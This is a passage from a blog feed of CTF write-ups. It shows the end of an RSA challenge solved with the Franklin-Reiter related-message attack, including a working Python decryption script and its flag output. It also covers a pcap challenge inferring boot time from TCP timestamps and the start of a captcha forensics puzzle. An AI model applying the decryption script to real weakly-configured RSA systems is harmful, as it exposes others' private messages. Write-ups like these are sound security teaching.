</span><span class="line">	<span class="n">encrypted</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">user_id</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">user_id</span><span class="o">**</span><span class="mi">2</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;encrypted.&quot;</span>
</span><span class="line">	<span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;DOne!&quot;</span>
</span><span class="line">
</span><span class="line"><span class="n">server</span> <span class="o">=</span> <span class="n">threadedserver</span><span class="p">((</span><span class="s">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">),</span> <span class="n">incoming</span><span class="p">)</span>
</span><span class="line"><span class="n">server</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">4</span>
</span><span class="line"><span class="n">server_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">)</span>
</span><span class="line"><span class="n">server_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class="line"><span class="n">server_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span><span class="line"><span class="n">server_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The interesting part is the following:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="python"><span class="line">	<span class="n">N</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">user_id</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="n">N</span><span class="p">,</span> <span class="n">e</span>
</span><span class="line">	<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class="line">	<span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class="line">	<span class="n">user_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;Got the user id!&quot;</span>
</span><span class="line">	<span class="n">encrypted</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">user_id</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">user_id</span><span class="o">**</span><span class="mi">2</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>By looking at these instructions we can notice that</p>

<ul>
  <li>the application accepts 3 parameters as imput, separated by a space</li>
  <li>the program splits them to generate N, e and user_id, where N is the modulus and e is the exponent</li>
  <li>and then it encrypts the message.</li>
</ul>

<p>But if we look at the encryption function more closely, we can notice that the user_id plays a key role here, as it’s used to modify the supplied message before the RSA encryption is performed.</p>

<p>The encryption itself is done with a typical RSA equation where we have</p>

<script type="math/tex; mode=display">% &lt;![CDATA[

\begin{align}
c &\equiv m^e \pmod{n}
\end{align}
 %]]&gt;</script>

<p>but m in this specific case is</p>

<script type="math/tex; mode=display">
\begin{align}
m = user\_id * t + user\_id^2
\end{align}
</script>

<p>where t is the user supplied text</p>

<p>So, putting things togeder we have:</p>

<ul>
  <li>two different encrypted messages</li>
  <li>a small public exponent: 3</li>
  <li>the same public key being used for both messages, because the public key (e, n) is the same in both encryption processes</li>
</ul>

<p>Plus, we also have a user_id parameter which differs, and allows us to determine a linear relation between the two messages so that</p>

<script type="math/tex; mode=display">% &lt;![CDATA[

\begin{align}
m_1 &\equiv \alpha m_2 + \beta \pmod{n} 
\end{align}
 %]]&gt;</script>

<p>This is a convenient situation, because there is an interesting theorem: the theorem of Franklin-Raiter that states:</p>

<p>Set <script type="math/tex"> e = 3 </script> and let <script type="math/tex"> (N, e)</script>  be an RSA public key. Let <script type="math/tex"> M_1 \neq M2 \in \mathbb{Z}^*_N </script> satisfy <script type="math/tex"> M_1 \equiv f(M_2) \pmod{n} </script> for some linear polynomial <script type="math/tex"> f = \alpha x + \beta \in \mathbb{Z}_N[x] </script> with <script type="math/tex"> b \neq 0 </script> . Then, given <script type="math/tex"> (N, e, C_1, C_2, f) </script>, the attacker can recover <script type="math/tex"> M_1, M_2 </script> in time quadratic in <script type="math/tex">log_2 N </script>.</p>

<p>The original paper which can be found here: https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf</p>

<p>also provides us with all the mathematical functions we need to calculate the value of our plaintext message from the encrypted messages: so all we were left to do was to calculate <script type="math/tex">M_2</script> in function of <script type="math/tex">M_1</script> as shown above, and implement the formula in a python script to compute the values for us; once the plaintext for the message is recovered, it’s then just a matter of extracting <script type="math/tex">t</script>.</p>

<p>First let’s start by working on the messages and have them set in a proper way: since we need <script type="math/tex">\alpha</script> and <script type="math/tex">\beta</script> we procede as follows.</p>

<p>Given</p>

<ul>
  <li>user_id1 as the first message userid</li>
  <li>user_id2 as the second message userid</li>
  <li>t as the plaintext we need to recover</li>
  <li>x as the modular multiplicative inverse of 37</li>
</ul>

<script type="math/tex; mode=display">
\begin{gather*}
user\_id1 = 37 \\
user\_id2 = 52 \\
\\
M_1 \equiv 37 * t + 37^2 \pmod{n} \\
M_2 \equiv 52 * t + 52^2 \pmod{n} \\
\\
t \equiv x(M_1 - 37^2) \pmod{n} \\
\\
m2 \equiv 52xM_1 - 52*37^2x +52^2 \pmod{n} \\
\\
a \equiv 52x \pmod{n} \\
b \equiv 52^2 - 52*37^2x \pmod{n} \\

\end{gather*}

</script>

<p>Now that we have <script type="math/tex">\alpha</script> and <script type="math/tex">\beta</script> what remains to do is punch them in our python script with <script type="math/tex">C_1, C_2</script> and <script type="math/tex">N</script> to retrieve <script type="math/tex">M_1</script></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
</span><span class="line">
</span><span class="line"><span class="c"># Functions for calculating the modular inverse multiplier</span>
</span><span class="line"><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class="line">    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class="line">	<span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">    <span class="k">else</span><span class="p">:</span>
</span><span class="line">	<span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class="line">	<span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class="line">    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class="line">    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class="line">	<span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class="line">    <span class="k">else</span><span class="p">:</span>
</span><span class="line">	<span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span><span class="line">
</span><span class="line"><span class="c">#The modulus</span>
</span><span class="line"><span class="n">N</span> <span class="o">=</span> <span class="s">&quot;fd2adfc8f9e88d3f31941e82bef75f6f9afcbba4ba2fc19e71aab2bf5eb3dbbfb1ff3e84b6a4900f472cc9450205d2062fa6e532530938ffb9e144e4f9307d8a2ebd01ae578fd10699475491218709cfa0aa1bfbd7f2ebc5151ce9c7e7256f14915a52d235625342c7d052de0521341e00db5748bcad592b82423c556f1c1051&quot;</span>
</span><span class="line"><span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c">#The exponent</span>
</span><span class="line"><span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
</span><span class="line">
</span><span class="line"><span class="c">#Encrypted message 1</span>
</span><span class="line"><span class="n">c1</span> <span class="o">=</span> <span class="s">&quot;0x81579ec88d73deaf602426946939f0339fed44be1b318305e1ab8d4d77a8e1dd7c67ea9cbac059ef06dd7bb91648314924d65165ec66065f4af96f7b4ce53f8edac10775e0d82660aa98ca62125699f7809dac8cf1fc8d44a09cc44f0d04ee318fb0015e5d7dcd7a23f6a5d3b1dbbdf8aab207245edf079d71c6ef5b3fc04416L&quot;</span>
</span><span class="line"><span class="n">c1</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c">#Encrypted message 2</span>
</span><span class="line"><span class="n">c2</span> <span class="o">=</span> <span class="s">&quot;0x1348effb7ff42372122f372020b9b22c8e053e048c72258ba7a2606c82129d1688ae6e0df7d4fb97b1009e7a3215aca9089a4dfd6e81351d81b3f4e1b358504f024892302cd72f51000f1664b2de9578fbb284427b04ef0a38135751864541515eada61b4c72e57382cf901922094b3fe0b5ebbdbac16dc572c392f6c9fbd01eL&quot;</span>
</span><span class="line"><span class="n">c2</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">x</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="mi">52</span><span class="o">*</span><span class="n">x</span><span class="p">)</span><span class="o">%</span><span class="n">N</span>
</span><span class="line"><span class="n">b</span> <span class="o">=</span> <span class="p">((</span><span class="mi">52</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">52</span><span class="o">*</span><span class="p">(</span><span class="mi">37</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="n">x</span><span class="p">)</span><span class="o">%</span><span class="n">N</span>
</span><span class="line"><span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="p">(</span><span class="n">c2</span> <span class="o">-</span> <span class="p">(</span><span class="n">a</span><span class="o">**</span><span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="n">c1</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">b</span><span class="o">**</span><span class="mi">3</span><span class="p">)))</span><span class="o">%</span><span class="n">N</span>
</span><span class="line">
</span><span class="line"><span class="n">y</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span><span class="line"><span class="n">m1</span> <span class="o">=</span> <span class="p">((</span><span class="n">b</span> <span class="o">*</span> <span class="p">(</span><span class="n">c2</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">a</span><span class="o">**</span><span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="n">c1</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span><span class="o">**</span><span class="mi">3</span><span class="p">)))</span> <span class="o">*</span><span class="n">y</span> <span class="p">)</span><span class="o">%</span><span class="n">N</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="s">&quot;M1 = &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">m1</span><span class="p">)</span>
</span><span class="line"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="o">*</span><span class="p">(</span><span class="n">m1</span> <span class="o">-</span> <span class="p">(</span><span class="mi">37</span><span class="o">**</span><span class="mi">2</span><span class="p">)))</span><span class="o">%</span><span class="n">N</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;t = &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Running the above script returns the following output</p>

<pre><code>0x576f772120596f757220666c61672069733a206469645f796f755f6b6e6f775f796f755f63616e5f736f6d6574696d65735f6763645f6f7574736964655f615f6575636c696465616e5f646f6d61696e0a
</code></pre>

<p>that converted to ASCII gives us the flag:</p>

<pre><code>Wow! Your flag is: did_you_know_you_can_sometimes_gcd_outside_a_euclidean_domain
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF Finals 2014: Important Day]]></title>
    <link href="http://swappage.github.io/blog/2014/10/23/asis-ctf-finals-2014-important-day/"/>
    <updated>2014-10-23T20:32:08+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/23/asis-ctf-finals-2014-important-day</id>
    <content type="html"><![CDATA[<p>Important Day was a 100 points challenge where you were provided with a pcap file, and asked to determine when the system was powered on.</p>

<p>By looking at the pcap file it really looked like a portscan, and by a quick google search i ran into a post from back in 2006 on seclists.org discussing about the possibility to guess the time of the last system reboot, by looking at the TCP protocol TSVAL option.
<!-- more --></p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-23/scan.png" /></p>

<p>Bsically since the TSVAL counter is reset to zero every time the system reboots (at least on many OSes), if you know the frequency at which TSVAL is increased, you can try to guess the boot timestamp.</p>

<p>As the challenge was providing a pcap, we had the capture timestamp, so if we had enaugh TSVAL options to compare, we could try to guess the system uptime.</p>

<p>The tickrate at which TSVAL increases is different from Operating System to Operating System, and with only the pcap i didn’t know the  target OS, but i had multiple packets to analyze, so it was probably a matter of math.</p>

<p>I decided to set the following filter</p>

<pre><code>tcp.options.timestamp.tsval &amp;&amp; ip.src == 192.168.100.78
</code></pre>

<p>so that i could get only the packets having the tsval option field set, and coming from the target system (not the stanning one)</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-23/filtered.png" /></p>

<p>And then analyzed how the TSVAL increased compared to the milliseconds in the packet capture timestamp.</p>

<p>By picking packets number number 4034 and 4039 we can notice:</p>

<pre><code>4034: Timestamp in ms: 1412157739276	TSVAL: 2400803286
4039: Timestamp in ms: 1412157739438	TSVAL: 2400803327
</code></pre>

<p>So with some simple math</p>

<pre><code>1412157739438 - 1412157739276 = 162
2400803327 - 2400803286 = 41
</code></pre>

<p>we can figure out that TSVAL increases by 1 tick every ~4ms</p>

<p>Ok, awesome
So now if our assumption was correct, we need to figure out what was the timestamp when TSVAL was 0:</p>

<p>so with some other simple math we discover</p>

<pre><code>(1412157739438 - 2400803327 * 4) / 1000= 1402554526.130
</code></pre>

<p>This timestamp corresponds to Thu, 12 Jun 2014 06:28:46 GMT</p>

<p>The flag was in the format of md5(ASIS_date) where date was in the format “%Y:%m:%d:%H:%M”</p>

<p>A quick conversion did the trick</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="mi">1402554526</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">&quot;%Y:%m:</span><span class="si">%d</span><span class="s">:%H:%M&quot;</span><span class="p">))</span>
</span><span class="line"><span class="mi">2014</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">58</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And at this point you’d say: <strong>“Wait, what’s this?, why 10:58?”</strong></p>

<p>And that’s the good point, and the fact that really disappointed me, as i spent <em>a lot of time</em> with trial and error thinking i was doing things wrong, when at  a certain point, with all the frustration i had accumulated, i went on the CTF IRC channel asking an admin if something was broken, and then he pointed out that i was supposed to provide the date in IRST timezone.</p>

<p>I mean, WHAT? are you kidding me? timestamps in forensics not in UTC? come on, please, guess what would happen if you were to ask logs to an ISP for a specific IP address at a certain timestamp not in UTC.. you might send an innocent on trial because of that.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SU-CTF 2014: Personalized Captcha]]></title>
    <link href="http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha/"/>
    <updated>2014-10-09T22:09:39+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha</id>
    <content type="html"><![CDATA[<p>Second CTF for the VulnHub team, and lots of fun with these puzzles.</p>

<p>This writeup is all about an interesting forensics and web game named “Personalized captcha” where the players were challenged to discover the value of a captcha string by analizing a provided pcap file.</p>

<!-- more -->

<p>The pcap file was ~9MB in size, which is not big, but for sure bigger then usual for a CTF puzzle, and by a first look at it using wireshark it looked fairly messy, especially in terms of HTTP traffic, considering that a fairly good amount of HTTP requests and streams where in there.</p>

<p>Sorting things out by hand would have been fairly challenging, and when playing a CTF, you really have to be as fast as possible, so i decided to rely on a NFAT (Network forensics analysis tool) named Xplico, available in kali for dissecting it.</p>

<p>This tool is excellent for dissecting even big (100MB+) pcap files, and has really powerful filtering and search features, especially when you need to rebuild content for analysis, like web pages, images, audio files, voip communications and so on.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/packet_summary.png" /></p>

<p>Punching the pcap into the software made things clearer and more understandable then by simply looking at raw packets in wireshark, and in the first place i started looking at the sites the user visited.</p>

<p>The challenge hinted the players about the domain <em>captcha.ctf.sharif.edu</em> being down, which of course dragged me into digging more in depth about anything that i could find in the pcap about that domain.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/sharif_captcha.png" /></p>

<p>A quick search revealed that the user for whom we were trying to rebuild the captcha actually visited that site; i focused some effort in dissecting the communications between the user and the server, i went sure on a post request that seemed interesting but unfortunately the user never really submitted the captcha, so, unfortunately, not a chance to grab it from the POST request, even if it wasn’t encrypted.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/post.png" /></p>

<p>Well, in the end this was a 300 points worth puzzle, wouldn’t it be too easy that way?</p>

<p>Anyway, back to the challenge, at this point it was probably a good idea to try to rebuild the pages content.</p>

<p>Xplico in these things really rocks the world, because it can preview the content of web pages by rebuilding them entirely off a pcap file, i tried previewing the page as i usually do, but this time something went wrong.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/badpage.png" /></p>

<p>For the good actually, because this helped me in understanding the point of the puzzle (more on this later), but the page looked really weird, by quickly inspecting the source, I noticed that 2 CSS files were included in the html, but if we look at them in Xplico we can notice that the <em>style.css</em> was 0 bytes in size.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="cp">&lt;!doctype html&gt;</span>
</span><span class="line"><span class="nt">&lt;html&gt;</span>
</span><span class="line"><span class="nt">&lt;head&gt;</span>
</span><span class="line">	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
</span><span class="line">	<span class="nt">&lt;title&gt;</span>The Captcha<span class="nt">&lt;/title&gt;</span>
</span><span class="line">	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/bootstrap.css&quot;</span><span class="nt">&gt;</span>
</span><span class="line">	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
</span><span class="line"><span class="nt">&lt;/head&gt;</span>
</span><span class="line"><span class="nt">&lt;body&gt;</span>
</span><span class="line">...
</span><span class="line"><span class="nt">&lt;/body&gt;</span>
</span><span class="line"><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/wrongsize.png" /></p>

<p>mhh.. odd isn’t it? i double checked using wireshark and it actually resulted that something DID went wrong in pcap dissection by Xplico, did the challenge author know something i didn’t? was this done on purpose?</p>

<p>Yet, wireshark revealed the truth and at this point i decided to export the files directly from wireshark and restore their original paths so that the page would display properly; luckly wireshark provides an awesome feature to export files from HTTP strams, so it was just a matter of a couple of mouse clicks to get everything i needed.</p>

<p>Opening the web page in the browser revealed what was the page as it appeared to the user whom this traffic capture belonged to</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/wholepage.png" /></p>

<p>except for the fact, that the captcha was empty.</p>

<p>Yet, pieces of the puzzle were starting to make sense if put togeder; now i had a captcha field, but where are the links that i could see without the <em>style.css</em>?</p>

<p>Let’s take a look at the whole page code</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="cp">&lt;!doctype html&gt;</span>
</span><span class="line"><span class="nt">&lt;html&gt;</span>
</span><span class="line"><span class="nt">&lt;head&gt;</span>
</span><span class="line">	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
</span><span class="line">	<span class="nt">&lt;title&gt;</span>The Captcha<span class="nt">&lt;/title&gt;</span>
</span><span class="line">	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/bootstrap.css&quot;</span><span class="nt">&gt;</span>
</span><span class="line">	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;css/style.css&quot;</span><span class="nt">&gt;</span>
</span><span class="line"><span class="nt">&lt;/head&gt;</span>
</span><span class="line"><span class="nt">&lt;body&gt;</span>
</span><span class="line"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;container&quot;</span><span class="nt">&gt;</span>
</span><span class="line">	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;row&quot;</span><span class="nt">&gt;</span>
</span><span class="line">		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;col-xs-8 col-xs-offset-2 col-md-6 col-md-offset-3&quot;</span><span class="nt">&gt;</span>
</span><span class="line">			<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
</span><span class="line">				<span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">&quot;form-control mb5&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;comment&quot;</span> <span class="na">name=</span><span class="s">&quot;comment&quot;</span><span class="nt">&gt;&lt;/textarea&gt;</span>
</span><span class="line">				<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">class=</span><span class="s">&quot;form-control mb5&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;captcha&quot;</span> <span class="na">name=</span><span class="s">&quot;captcha&quot;</span><span class="nt">&gt;</span>
</span><span class="line">
</span><span class="line">				<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;captcha&quot;</span><span class="nt">&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/Hack&quot;</span><span class="nt">&gt;</span>P<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://wordpress.org/plugins/captcha/&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://wordpress.org/mobile/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://captchas.net/&quot;</span><span class="nt">&gt;</span>C<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/Hack&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class="line">
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.thefreedictionary.com/hack&quot;</span><span class="nt">&gt;</span>Y<span class="nt">&lt;/a&gt;</span>
